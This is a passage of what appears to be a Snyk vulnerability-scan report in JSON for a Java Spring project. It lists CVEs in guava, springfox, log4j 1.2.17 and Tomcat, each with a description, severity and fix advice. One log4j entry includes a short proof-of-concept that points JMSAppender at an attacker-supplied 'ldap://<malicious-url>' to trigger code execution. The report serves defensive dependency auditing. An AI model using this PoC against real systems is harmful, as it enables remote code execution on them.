IBM WebSphere, Oracle WebLogic and many other products.\n\n  \nAn attacker just needs to identify a piece of software that has both a vulnerable class on its path, and performs deserialization on untrusted data. Then all they need to do is send the payload into the deserializer, getting the command executed.\n  \n\n> Developers put too much trust in Java Object Serialization. Some even de-serialize objects pre-authentication. When deserializing an Object in Java you typically cast it to an expected type, and therefore Java's strict type system will ensure you only get valid object trees. Unfortunately, by the time the type checking happens, platform code has already created and executed significant logic. So, before the final type is checked a lot of code is executed from the readObject() methods of various objects, all of which is out of the developer's control. By combining the readObject() methods of various classes which are available on the classpath of the vulnerable application an attacker can execute functions (including calling Runtime.exec() to execute local OS commands).\n\n- Apache Blog\n  \n## Remediation\nUpgrade `com.google.guava:guava` to version 24.1.1-android, 24.1.1-jre or higher.\n## References\n- [GitHub Commit](https://github.com/google/guava/commit/7ec8718f1e6e2814dabaa4b9f96b6b33a813101c)\n- [Google Group Forum](https://groups.google.com/forum/#!topic/guava-announce/xqWALw4W1vs/discussion)\n- [RedHat Bugzilla Bug](https://bugzilla.redhat.com/show_bug.cgi?id=1573391)\n",
      "disclosureTime": "2018-04-25T07:28:15Z",
      "exploit": "Not Defined",
      "fixedIn": [
        "24.1.1-android",
        "24.1.1-jre"
      ],
      "functions": [
        {
          "functionId": {
            "className": "AtomicDoubleArray",
            "filePath": "com/google/common/util/concurrent/AtomicDoubleArray.java",
            "functionName": "readObject"
          },
          "version": [
            "[11.0, 24.1.1-android)",
            "(24.1.1-android, 24.1.1-jre)"
          ]
        }
      ],
      "functions_new": [
        {
          "functionId": {
            "className": "com.google.common.util.concurrent.AtomicDoubleArray",
            "functionName": "readObject"
          },
          "version": [
            "[11.0, 24.1.1-android)",
            "(24.1.1-android, 24.1.1-jre)"
          ]
        }
      ],
      "id": "SNYK-JAVA-COMGOOGLEGUAVA-32236",
      "identifiers": {
        "CVE": [
          "CVE-2018-10237"
        ],
        "CWE": [
          "CWE-119"
        ],
        "GHSA": [
          "GHSA-mvr2-9pj6-7w5j"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "guava",
        "groupId": "com.google.guava"
      },
      "modificationTime": "2020-12-14T14:41:04.745319Z",
      "moduleName": "com.google.guava:guava",
      "packageManager": "maven",
      "packageName": "com.google.guava:guava",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2018-05-02T13:38:04Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/google/guava/commit/7ec8718f1e6e2814dabaa4b9f96b6b33a813101c"
        },
        {
          "title": "Google Group Forum",
          "url": "https://groups.google.com/forum/%23%21topic/guava-announce/xqWALw4W1vs/discussion"
        },
        {
          "title": "RedHat Bugzilla Bug",
          "url": "https://bugzilla.redhat.com/show_bug.cgi?id=1573391"
        }
      ],
      "semver": {
        "vulnerable": [
          "[11.0, 24.1.1-android)",
          "(24.1.1-android, 24.1.1-jre)"
        ]
      },
      "severity": "medium",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "severityWithCritical": "medium",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "io.springfox:springfox-swagger2@2.2.2",
        "com.google.guava:guava@18.0"
      ],
      "upgradePath": [
        false,
        "io.springfox:springfox-swagger2@2.10.0"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.google.guava:guava",
      "version": "18.0"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N/E:P",
      "alternativeIds": [],
      "creationTime": "2021-02-16T14:01:38.458624Z",
      "credit": [
        "crazykid95"
      ],
      "cvssScore": 6.5,
      "description": "## Overview\n[io.springfox:springfox-swagger-ui](https://github.com/springfox/springfox) is an Automated JSON API documentation for API's built with Spring\n\nAffected versions of this package are vulnerable to Relative Path Overwrite (RPO). Attackers are able to use the Relative Path Overwrite (RPO) technique to perform CSS-based input field value exfiltration, such as exfiltration of a CSRF token value i.e. allows the embedding of untrusted JSON data from remote servers, using `<style>@import` within the JSON data.\n## Remediation\nUpgrade `io.springfox:springfox-swagger-ui` to version 2.10.0 or higher.\n## References\n- [GitHub Commit #2](https://github.com/springfox/springfox/commit/26f72f0d16b166e12c20255a4ee907dc10685cf8#diff-97232cc54495752f2b1fbafb152d5d04e19e8e4b3ede08c67e1966233c9a19e1)\n- [GitHub PR](https://github.com/swagger-api/swagger-ui/pull/5616)\n- [GitHub Release](https://github.com/swagger-api/swagger-ui/releases/tag/v3.23.11)\n- [POC by crazykid95](https://github.com/tarantula-team/CSS-injection-in-Swagger-UI)\n",
      "disclosureTime": "2019-10-10T22:15:00Z",
      "exploit": "Proof of Concept",
      "fixedIn": [
        "2.10.0"
      ],
      "functions": [],
      "functions_new": [],
      "id": "SNYK-JAVA-IOSPRINGFOX-1075064",
      "identifiers": {
        "CVE": [
          "CVE-2019-17495"
        ],
        "CWE": [
          "CWE-94"
        ],
        "GHSA": [
          "GHSA-c427-hjc3-wrfw"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "springfox-swagger-ui",
        "groupId": "io.springfox"
      },
      "modificationTime": "2021-09-24T13:25:49.079830Z",
      "moduleName": "io.springfox:springfox-swagger-ui",
      "packageManager": "maven",
      "packageName": "io.springfox:springfox-swagger-ui",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2019-10-11T13:21:30Z",
      "references": [
        {
          "title": "GitHub Commit #2",
          "url": "https://github.com/springfox/springfox/commit/26f72f0d16b166e12c20255a4ee907dc10685cf8%23diff-97232cc54495752f2b1fbafb152d5d04e19e8e4b3ede08c67e1966233c9a19e1"
        },
        {
          "title": "GitHub PR",
          "url": "https://github.com/swagger-api/swagger-ui/pull/5616"
        },
        {
          "title": "GitHub Release",
          "url": "https://github.com/swagger-api/swagger-ui/releases/tag/v3.23.11"
        },
        {
          "title": "POC by crazykid95",
          "url": "https://github.com/tarantula-team/CSS-injection-in-Swagger-UI"
        }
      ],
      "semver": {
        "vulnerable": [
          "[,2.10.0)"
        ]
      },
      "severity": "medium",
      "socialTrendAlert": false,
      "title": "Relative Path Overwrite (RPO)",
      "severityWithCritical": "medium",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "io.springfox:springfox-swagger-ui@2.2.2"
      ],
      "upgradePath": [
        false,
        "io.springfox:springfox-swagger-ui@2.10.0"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "io.springfox:springfox-swagger-ui",
      "version": "2.2.2"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N",
      "alternativeIds": [],
      "creationTime": "2021-06-04T15:38:41.700520Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 3.7,
      "description": "## Overview\n[log4j:log4j](https://github.com/apache/log4j) is a 1.x branch of the Apache Log4j project.\n\nAffected versions of this package are vulnerable to Man-in-the-Middle (MitM). Improper validation of certificate with host mismatch in Apache Log4j SMTP appender. This could allow an SMTPS connection to be intercepted by a man-in-the-middle attack which could leak any log messages sent through that appender.\n## Remediation\nThere is no fixed version for `log4j:log4j`.\n## References\n- [GitHub Commit](https://github.com/apache/logging-log4j2/commit/6851b5083ef9610bae320bf07e1f24d2aa08851b)\n- [Jira Issue](https://issues.apache.org/jira/browse/LOG4J2-2819)\n- [Reload4j Fix Commit](https://github.com/qos-ch/reload4j/commit/90bc7826c206c256ee9ec6b51318cc1865cc19e9)\n",
      "disclosureTime": "2020-04-27T17:16:14Z",
      "exploit": "Not Defined",
      "fixedIn": [],
      "functions": [],
      "functions_new": [],
      "id": "SNYK-JAVA-LOG4J-1300176",
      "identifiers": {
        "CVE": [
          "CVE-2020-9488"
        ],
        "CWE": [
          "CWE-297"
        ],
        "GHSA": [
          "GHSA-vwqq-5vrc-xw9h"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "log4j",
        "groupId": "log4j"
      },
      "modificationTime": "2022-03-27T14:22:09.168396Z",
      "moduleName": "log4j:log4j",
      "packageManager": "maven",
      "packageName": "log4j:log4j",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2020-04-28T17:16:14Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/apache/logging-log4j2/commit/6851b5083ef9610bae320bf07e1f24d2aa08851b"
        },
        {
          "title": "Jira Issue",
          "url": "https://issues.apache.org/jira/browse/LOG4J2-2819"
        },
        {
          "title": "Reload4j Fix Commit",
          "url": "https://github.com/qos-ch/reload4j/commit/90bc7826c206c256ee9ec6b51318cc1865cc19e9"
        }
      ],
      "semver": {
        "vulnerable": [
          "[0,]"
        ]
      },
      "severity": "low",
      "socialTrendAlert": false,
      "title": "Man-in-the-Middle (MitM)",
      "severityWithCritical": "low",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "log4j:log4j@1.2.17"
      ],
      "upgradePath": [],
      "isUpgradable": false,
      "isPatchable": false,
      "name": "log4j:log4j",
      "version": "1.2.17"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:H/E:P",
      "alternativeIds": [],
      "creationTime": "2021-12-13T14:52:40.887231Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 6.6,
      "description": "## Overview\n\n[log4j:log4j](https://github.com/apache/log4j) is a 1.x branch of the Apache Log4j project.\n\n\nAffected versions of this package are vulnerable to Arbitrary Code Execution.\n<br /> **Note:** Even though this vulnerability appears to be related to the [log4j 2.x vulnerability](https://security.snyk.io/vuln/SNYK-JAVA-ORGAPACHELOGGINGLOG4J-2314720), the 1.x branch of the module requires an attacker to have access to modify configurations to be exploitable, which is rarely possible.\r\n\r\nIn order to leverage this vulnerability the following conditions must be met:\r\n\r\n1. The application has enabled `JMSAppender` (or a class that extends `JMSAppender`)\r\n2. The attacker has access to directly modify the `TopicBindingName` or `TopicConnectionFactoryBindingName` configuration variables - which is an unlikely scenario \r\n\r\nIf these conditions are met, log4j 1.x allows a `lookup` feature that does not protect against attacker-controlled LDAP and other JNDI related endpoints. Therefore, an attacker with access to the aforementioned configuration variables is able to execute arbitrary code when loaded from an LDAP server.\r\n\r\n## PoC\r\n\r\n```\r\nimport org.apache.log4j.net.JMSAppender;\r\n// ...\r\nJMSAppender a = new JMSAppender();\r\na.setTopicConnectionFactoryBindingName(\"ldap://<malicious-url>\");\r\n// OR a.setTopicBindingName(\"ldap://<malicious-url>\");\r\na.activateOptions();\r\n```\n\n## Remediation\n\nThere is no fixed version for `log4j:log4j`.\n\n\nlog4j 1.x is End-of-Life, and a fixed version will not be released.\nIf you believe your application meets the conditions mentioned in the advisory, consider upgrading to the latest log4j 2.x version, or block user input from reaching `JMSAppender` configurations.\n\n## References\n\n- [Apache Mail](https://lists.apache.org/thread/0x4zvtq92yggdgvwfgsftqrj4xx5w0nx)\n\n- [GitHub Comment](https://github.com/apache/logging-log4j2/pull/608#issuecomment-991723301)\n\n- [GitHub Discussion](https://github.com/apache/logging-log4j2/pull/608)\n",
      "disclosureTime": "2021-12-10T00:00:00Z",
      "exploit": "Proof of Concept",
      "fixedIn": [],
      "functions": [],
      "functions_new": [],
      "id": "SNYK-JAVA-LOG4J-2316893",
      "identifiers": {
        "CVE": [
          "CVE-2021-4104"
        ],
        "CWE": [
          "CWE-94"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "log4j",
        "groupId": "log4j"
      },
      "modificationTime": "2022-02-15T15:25:01.031655Z",
      "moduleName": "log4j:log4j",
      "packageManager": "maven",
      "packageName": "log4j:log4j",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2021-12-13T15:31:00Z",
      "references": [
        {
          "title": "Apache Mail",
          "url": "https://lists.apache.org/thread/0x4zvtq92yggdgvwfgsftqrj4xx5w0nx"
        },
        {
          "title": "GitHub Comment",
          "url": "https://github.com/apache/logging-log4j2/pull/608%23issuecomment-991723301"
        },
        {
          "title": "GitHub Discussion",
          "url": "https://github.com/apache/logging-log4j2/pull/608"
        }
      ],
      "semver": {
        "vulnerable": [
          "[0,]"
        ]
      },
      "severity": "medium",
      "socialTrendAlert": false,
      "title": "Arbitrary Code Execution",
      "severityWithCritical": "medium",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "log4j:log4j@1.2.17"
      ],
      "upgradePath": [],
      "isUpgradable": false,
      "isPatchable": false,
      "name": "log4j:log4j",
      "version": "1.2.17"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
      "alternativeIds": [],
      "creationTime": "2022-01-18T17:06:29.378900Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[log4j:log4j](https://github.com/apache/log4j) is a 1.x branch of the Apache Log4j project.\n\nAffected versions of this package are vulnerable to SQL Injection. By design, the `JDBCAppender` in Log4j 1.2.x accepts an SQL statement as a configuration parameter where the values to be inserted are converters from `PatternLayout`. The message converter, `%m`, is likely to always be included. This allows attackers to manipulate the SQL by entering crafted strings into input fields or headers of an application that are logged allowing unintended SQL queries to be executed.\r\n\r\n*Note:* this issue only affects Log4j 1.x when specifically configured to use the `JDBCAppender`, which is not the default. \r\n\r\nApache Log4j 1.2 reached end of life in August 2015. Users should upgrade to Log4j 2 as it addresses numerous other issues from the previous versions. Beginning in version 2.0-beta8, the `JDBCAppender` was re-introduced with proper support for parameterized SQL queries and further customization over the columns written to in logs.\n## Remediation\nThere is no fixed version for `log4j:log4j`.\n## References\n- [Apache Mailing List](https://lists.apache.org/thread/pt6lh3pbsvxqlwlp4c5l798dv2hkc85y)\n- [Apache Security Advisory](https://logging.apache.org/log4j/1.2/index.html)\n- [Reload4j Fix Commit](https://github.com/qos-ch/reload4j/commit/e845f28e7fb0ecbc0fcce383b11179f2650a51a2)\n",
      "disclosureTime": "2022-01-18T17:01:37Z",
      "exploit": "Not Defined",
      "fixedIn": [],
      "functions": [],
      "functions_new": [],
      "id": "SNYK-JAVA-LOG4J-2342645",
      "identifiers": {
        "CVE": [
          "CVE-2022-23305"
        ],
        "CWE": [
          "CWE-89"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "log4j",
        "groupId": "log4j"
      },
      "modificationTime": "2022-03-27T14:20:21.122319Z",
      "moduleName": "log4j:log4j",
      "packageManager": "maven",
      "packageName": "log4j:log4j",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2022-01-18T17:13:25Z",
      "references": [
        {
          "title": "Apache Mailing List",
          "url": "https://lists.apache.org/thread/pt6lh3pbsvxqlwlp4c5l798dv2hkc85y"
        },
        {
          "title": "Apache Security Advisory",
          "url": "https://logging.apache.org/log4j/1.2/index.html"
        },
        {
          "title": "Reload4j Fix Commit",
          "url": "https://github.com/qos-ch/reload4j/commit/e845f28e7fb0ecbc0fcce383b11179f2650a51a2"
        }
      ],
      "semver": {
        "vulnerable": [
          "[0,]"
        ]
      },
      "severity": "high",
      "socialTrendAlert": false,
      "title": "SQL Injection",
      "severityWithCritical": "high",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "log4j:log4j@1.2.17"
      ],
      "upgradePath": [],
      "isUpgradable": false,
      "isPatchable": false,
      "name": "log4j:log4j",
      "version": "1.2.17"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
      "alternativeIds": [],
      "creationTime": "2022-01-18T17:08:37.955423Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[log4j:log4j](https://github.com/apache/log4j) is a 1.x branch of the Apache Log4j project.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. CVE-2020-9493 identified a deserialization issue that was present in Apache Chainsaw. Prior to Chainsaw V2.0 Chainsaw was a component of Apache Log4j 1.2.x where the same issue exists.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating object from sequence of bytes is called deserialization. Serialization is commonly used for communication (sharing objects between multiple hosts) and persistence (store the object state in a file or a database). It is an integral part of popular protocols like _Remote Method Invocation (RMI)_, _Java Management Extension (JMX)_, _Java Messaging System (JMS)_, _Action Message Format (AMF)_, _Java Server Faces (JSF) ViewState_, etc.\n\n_Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) is when the application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, thus allowing the attacker to control the state or the flow of the execution.\n  \n## Remediation\nThere is no fixed version for `log4j:log4j`.\n## References\n- [Apache Mailing List](https://lists.apache.org/thread/rg4yyc89vs3dw6kpy3r92xop9loywyhh)\n- [Apache Security Advisory](https://logging.apache.org/log4j/1.2/index.html)\n- [NVD Information](https://nvd.nist.gov/vuln/detail/CVE-2020-9493)\n- [Reload4j Fix Commit](https://github.com/qos-ch/reload4j/commit/64902fe18ce5a5dd40487051a2f6231d9fbbe9b0)\n",
      "disclosureTime": "2022-01-18T17:06:32Z",
      "exploit": "Not Defined",
      "fixedIn": [],
      "functions": [],
      "functions_new": [],
      "id": "SNYK-JAVA-LOG4J-2342646",
      "identifiers": {
        "CVE": [
          "CVE-2022-23307"
        ],
        "CWE": [
          "CWE-502"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "log4j",
        "groupId": "log4j"
      },
      "modificationTime": "2022-03-27T14:18:24.241895Z",
      "moduleName": "log4j:log4j",
      "packageManager": "maven",
      "packageName": "log4j:log4j",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2022-01-18T17:13:25Z",
      "references": [
        {
          "title": "Apache Mailing List",
          "url": "https://lists.apache.org/thread/rg4yyc89vs3dw6kpy3r92xop9loywyhh"
        },
        {
          "title": "Apache Security Advisory",
          "url": "https://logging.apache.org/log4j/1.2/index.html"
        },
        {
          "title": "NVD Information",
          "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-9493"
        },
        {
          "title": "Reload4j Fix Commit",
          "url": "https://github.com/qos-ch/reload4j/commit/64902fe18ce5a5dd40487051a2f6231d9fbbe9b0"
        }
      ],
      "semver": {
        "vulnerable": [
          "[0,]"
        ]
      },
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "severityWithCritical": "high",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "log4j:log4j@1.2.17"
      ],
      "upgradePath": [],
      "isUpgradable": false,
      "isPatchable": false,
      "name": "log4j:log4j",
      "version": "1.2.17"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
      "alternativeIds": [],
      "creationTime": "2022-01-18T17:25:51.891230Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[log4j:log4j](https://github.com/apache/log4j) is a 1.x branch of the Apache Log4j project.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. `JMSSink` in all versions of Log4j 1.x is vulnerable to deserialization of untrusted data when the attacker has write access to the Log4j configuration or if the configuration references an LDAP service the attacker has access to. The attacker can provide a `TopicConnectionFactoryBindingName` configuration causing `JMSSink` to perform `JNDI` requests that result in remote code execution in a similar fashion to [`CVE-2021-4104`](https://security.snyk.io/vuln/SNYK-JAVA-LOG4J-2316893).  \r\n\r\n*Note:* this issue only affects Log4j 1.x when specifically configured to use `JMSSink`, which is not the default.\r\n\r\nApache Log4j 1.2 reached end of life in August 2015. Users should upgrade to Log4j 2 as it addresses numerous other issues from the previous versions.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating object from sequence of bytes is called deserialization. Serialization is commonly used for communication (sharing objects between multiple hosts) and persistence (store the object state in a file or a database). It is an integral part of popular protocols like _Remote Method Invocation (RMI)_, _Java Management Extension (JMX)_, _Java Messaging System (JMS)_, _Action Message Format (AMF)_, _Java Server Faces (JSF) ViewState_, etc.\n\n_Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) is when the application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, thus allowing the attacker to control the state or the flow of the execution.\n  \n## Remediation\nThere is no fixed version for `log4j:log4j`.\n## References\n- [Apache Mailing List](https://lists.apache.org/thread/bsr3l5qz4g0myrjhy9h67bcxodpkwj4w)\n- [Apache Security Advisory](https://logging.apache.org/log4j/1.2/index.html)\n- [Reload4j Fix Commit](https://github.com/qos-ch/reload4j/commit/f221f2427c45134cf5768f46279ddf72fe1407c9)\n",
      "disclosureTime": "2022-01-18T17:22:50Z",
      "exploit": "Not Defined",
      "fixedIn": [],
      "functions": [],
      "functions_new": [],
      "id": "SNYK-JAVA-LOG4J-2342647",
      "identifiers": {
        "CVE": [
          "CVE-2022-23302"
        ],
        "CWE": [
          "CWE-502"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "log4j",
        "groupId": "log4j"
      },
      "modificationTime": "2022-03-27T14:15:25.880692Z",
      "moduleName": "log4j:log4j",
      "packageManager": "maven",
      "packageName": "log4j:log4j",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2022-01-18T17:28:19Z",
      "references": [
        {
          "title": "Apache Mailing List",
          "url": "https://lists.apache.org/thread/bsr3l5qz4g0myrjhy9h67bcxodpkwj4w"
        },
        {
          "title": "Apache Security Advisory",
          "url": "https://logging.apache.org/log4j/1.2/index.html"
        },
        {
          "title": "Reload4j Fix Commit",
          "url": "https://github.com/qos-ch/reload4j/commit/f221f2427c45134cf5768f46279ddf72fe1407c9"
        }
      ],
      "semver": {
        "vulnerable": [
          "[0,]"
        ]
      },
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "severityWithCritical": "high",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "log4j:log4j@1.2.17"
      ],
      "upgradePath": [],
      "isUpgradable": false,
      "isPatchable": false,
      "name": "log4j:log4j",
      "version": "1.2.17"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P",
      "alternativeIds": [],
      "creationTime": "2020-06-18T15:47:31.144561Z",
      "credit": [
        "Marcio Almeida de Macedo"
      ],
      "cvssScore": 9.8,
      "description": "## Overview\n[log4j:log4j](https://github.com/apache/log4j) is a 1.x branch of the Apache Log4j project.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. Included in Log4j 1.2 is a SocketServer class that is vulnerable to deserialization of untrusted data which can be exploited to remotely execute arbitrary code when combined with a deserialization gadget when listening to untrusted network traffic for log data.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating object from sequence of bytes is called deserialization. Serialization is commonly used for communication (sharing objects between multiple hosts) and persistence (store the object state in a file or a database). It is an integral part of popular protocols like _Remote Method Invocation (RMI)_, _Java Management Extension (JMX)_, _Java Messaging System (JMS)_, _Action Message Format (AMF)_, _Java Server Faces (JSF) ViewState_, etc.\n\n_Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)), is when the application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, letting the attacker to control the state or the flow of the execution.\n\nJava deserialization issues have been known for years. However, interest in the issue intensified greatly in 2015, when classes that could be abused to achieve remote code execution were found in a [popular library (Apache Commons Collection)](https://snyk.io/vuln/SNYK-JAVA-COMMONSCOLLECTIONS-30078). These classes were used in zero-days affecting IBM WebSphere, Oracle WebLogic and many other products.\n\n  \nAn attacker just needs to identify a piece of software that has both a vulnerable class on its path, and performs deserialization on untrusted data. Then all they need to do is send the payload into the deserializer, getting the command executed.\n  \n\n> Developers put too much trust in Java Object Serialization. Some even de-serialize objects pre-authentication. When deserializing an Object in Java you typically cast it to an expected type, and therefore Java's strict type system will ensure you only get valid object trees. Unfortunately, by the time the type checking happens, platform code has already created and executed significant logic. So, before the final type is checked a lot of code is executed from the readObject() methods of various objects, all of which is out of the developer's control. By combining the readObject() methods of various classes which are available on the classpath of the vulnerable application an attacker can execute functions (including calling Runtime.exec() to execute local OS commands).\n\n- Apache Blog\n  \n## Remediation\nThere is no fixed version for `log4j:log4j`.\n## References\n- [Apache Security Advisory](https://lists.apache.org/thread.html/eea03d504b36e8f870e8321d908e1def1addda16adda04327fe7c125%40%3Cdev.logging.apache.org%3E)\n- [PoC](https://0xsapra.github.io/website/CVE-2019-17571)\n",
      "disclosureTime": "2019-12-22T09:33:11Z",
      "exploit": "Proof of Concept",
      "fixedIn": [],
      "functions": [
        {
          "functionId": {
            "className": "SocketServer",
            "filePath": "org/apache/log4j/net/SocketServer.java",
            "functionName": "main"
          },
          "version": [
            "[0,]"
          ]
        }
      ],
      "functions_new": [
        {
          "functionId": {
            "className": "org.apache.log4j.net.SocketServer",
            "functionName": "main"
          },
          "version": [
            "[0,]"
          ]
        }
      ],
      "id": "SNYK-JAVA-LOG4J-572732",
      "identifiers": {
        "CVE": [
          "CVE-2019-17571"
        ],
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-2qrg-x229-3v8q"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "log4j",
        "groupId": "log4j"
      },
      "modificationTime": "2022-02-11T15:25:01.017358Z",
      "moduleName": "log4j:log4j",
      "packageManager": "maven",
      "packageName": "log4j:log4j",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2020-06-19T09:33:01Z",
      "references": [
        {
          "title": "Apache Security Advisory",
          "url": "https://lists.apache.org/thread.html/eea03d504b36e8f870e8321d908e1def1addda16adda04327fe7c125%40%3Cdev.logging.apache.org%3E"
        },
        {
          "title": "PoC",
          "url": "https://0xsapra.github.io/website/CVE-2019-17571"
        }
      ],
      "semver": {
        "vulnerable": [
          "[0,]"
        ]
      },
      "severity": "critical",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "severityWithCritical": "critical",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "log4j:log4j@1.2.17"
      ],
      "upgradePath": [],
      "isUpgradable": false,
      "isPatchable": false,
      "name": "log4j:log4j",
      "version": "1.2.17"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
      "alternativeIds": [],
      "creationTime": "2021-10-05T20:53:52.856526Z",
      "credit": [
        "Thomas Wozenilek",
        "David Frankson"
      ],
      "cvssScore": 7.5,
      "description": "## Overview\n[org.apache.tomcat.embed:tomcat-embed-core](https://mvnrepository.com/artifact/org.apache.tomcat.embed/tomcat-embed-core) is a Core Tomcat implementation.\n\nAffected versions of this package are vulnerable to Denial of Service (DoS). When Tomcat is configured to use NIO+OpenSSL or NIO2+OpenSSL for TLS, a specially-crafted packet could be used to trigger an infinite loop resulting in a denial of service.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.\n\nUnlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.\n\nOne popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.\n\nWhen it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.\n\nTwo common types of DoS vulnerabilities:\n\n* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).\n\n* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)\n\n## Remediation\nUpgrade `org.apache.tomcat.embed:tomcat-embed-core` to version 10.0.4, 8.5.64, 9.0.44 or higher.\n## References\n- [Apache Security Advisory](https://lists.apache.org/thread.html/rccdef0349fdf4fb73a4e4403095446d7fe6264e0a58e2df5c6799434%40%3Cannounce.tomcat.apache.org%3E)\n- [GitHub Commit](https://github.com/apache/tomcat/commit/34115fb3c83f6cd97772232316a492a4cc5729e0)\n- [RedHat Bugzilla Bug](https://bugzilla.redhat.com/show_bug.cgi?id=2004820)\n- [Tomcat Advisory 10](https://tomcat.apache.org/security-10.html#Fixed_in_Apache_Tomcat_10.0.4)\n- [Tomcat Advisory 8](https://tomcat.apache.org/security-8.html#Fixed_in_Apache_Tomcat_8.5.64)\n- [Tomcat Advisory 9](https://tomcat.apache.org/security-9.html#Fixed_in_Apache_Tomcat_9.0.44)\n",
      "disclosureTime": "2021-09-15T00:00:00Z",
      "exploit": "Not Defined",
      "fixedIn": [
        "10.0.4",
        "8.5.64",
        "9.0.44"
      ],
      "functions": [],
      "functions_new": [],
      "id": "SNYK-JAVA-ORGAPACHETOMCATEMBED-1728264",
      "identifiers": {
        "CVE": [
          "CVE-2021-41079"
        ],
        "CWE": [
          "CWE-400"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "tomcat-embed-core",
        "groupId": "org.apache.tomcat.embed"
      },
      "modificationTime": "2021-10-05T20:53:52.856542Z",
      "moduleName": "org.apache.tomcat.embed:tomcat-embed-core",
      "packageManager": "maven",
      "packageName": "org.apache.tomcat.embed:tomcat-embed-core",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2021-09-16T15:47:52Z",
      "references": [
        {
          "title": "Apache Security Advisory",
